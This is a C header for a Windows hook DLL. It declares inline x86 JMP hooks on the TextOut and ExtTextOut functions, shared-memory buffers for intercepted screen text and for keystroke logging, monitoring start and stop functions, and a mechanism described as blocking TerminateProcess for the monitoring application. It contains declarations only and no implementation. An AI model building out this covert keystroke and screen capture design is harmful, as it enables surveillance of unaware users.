#if !defined(THIRTY2BITHOOKDLL_H)
#define THIRTY2BITHOOKDLL_H



/*
 *
 * includes
 *
 */
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>



/*
 *
 * definitions
 *
 */
// string definitions
#define NULLSTR ""
#define NULLCHAR '\0'
#define SPACESTR " "

// proc-hooking x86 assembly definitions
#define PROCHOOK_JMPCODE 0xE9

// misc
#define TBUFFERSIZE	200000
#define KBUFFERSIZE	2000
#define MAXTEXTOUT 8192
#define MUTEXTEXTNAME L"32 bit hook dll text buffer mutex"
#define MUTEXKEYNAME L"32 bit hook dll key buffer mutex"
#define PROCESSIDSTRING "*!~!*%ld*!~!*"
#define PROCESSIDMAX 20



/*
 *
 * types
 *
 */
// prochooking types
#pragma pack(1)
typedef struct _ProcHook
{
	BYTE byMovCode = PROCHOOK_JMPCODE;
	DWORD relativeJump;
}PROCHOOK, *PPROCHOOK;
#pragma pack()

typedef struct _HookRec
{
	unsigned __int32	ui32AddressFunc;
	unsigned __int32	ui32AddressShadowFunc;
	PROCHOOK			phOld;
	PROCHOOK			phNew;
}HOOKREC, *PHOOKREC;



/*
 *
 * shared memory variables
 *
 */
#pragma data_seg(".sd_32bithookdll")

// prochook text buffer variables
DWORD __dwLastTextProcessID = 0;
size_t __stTextBufferPtr = 0;
char __szTextBuffer[TBUFFERSIZE] = NULLSTR;

// keystroke logging buffer variables
DWORD __dwLastKeyProcessID = 0;
size_t __stKeyBufferPtr = 0;
char __szKeyBuffer[KBUFFERSIZE] = NULLSTR;

// process handle to block terminateprocess for
DWORD __dwRootAppID = 0;

// hook handles
HHOOK __hHook;

#pragma data_seg()



/*
 *
 * global variables
 *
 */
// dll handles, and process id's
HINSTANCE _hDll;
DWORD _dwCurrentProcessID = 0;
char _szCurrentProcessID[PROCESSIDMAX] = NULLSTR;

// monitoring app and hook statuses
BOOL _bIsRootApp = FALSE;
BOOL _bIsHooked = FALSE;

// mutex variables
HANDLE _hMutexText;
HANDLE _hMutexKey;

// prochooking HOOKREC variables
HOOKREC _hrTextOutA;
HOOKREC _hrTextOutW;
HOOKREC _hrExtTextOutA;
HOOKREC _hrExtTextOutW;



/*
 *
 * function prototypes
 *
 */
// message hook
LRESULT CALLBACK WINAPI MsgProc(int, WPARAM, LPARAM);

// public functions
void WINAPI StartMonitoring(void);
void WINAPI StopMonitoring(void);
void WINAPI GetTextBuffer(LPSTR, size_t *);
void WINAPI GetKeyBuffer(LPSTR, size_t *);

// prochooking shadow functions, intercepting 4 text display functions and TerminateProcess
BOOL WINAPI ShadowExtTextOutA(HDC, int, int, UINT, CONST RECT *, LPCSTR, UINT, CONST INT *);
BOOL WINAPI ShadowExtTextOutW(HDC, int, int, UINT, CONST RECT *, LPCWSTR, UINT, CONST INT *);
BOOL WINAPI ShadowTextOutA(HDC, int, int, LPCSTR, int);
BOOL WINAPI ShadowTextOutW(HDC, int, int, LPCWSTR, int);

// private functions
void WINAPI WriteToTextBuffer(LPCSTR, UINT);
void WINAPI WriteToKeyBuffer(LPCSTR, UINT);
void WINAPI CreateAllHooks(void);
void WINAPI DestroyAllHooks(void);
void WINAPI CreateHook(unsigned __int32, unsigned __int32, PHOOKREC);
void WINAPI DestroyHook(PHOOKREC);
void WINAPI HookFunction(PHOOKREC);
void WINAPI UnhookFunction(PHOOKREC);



#endif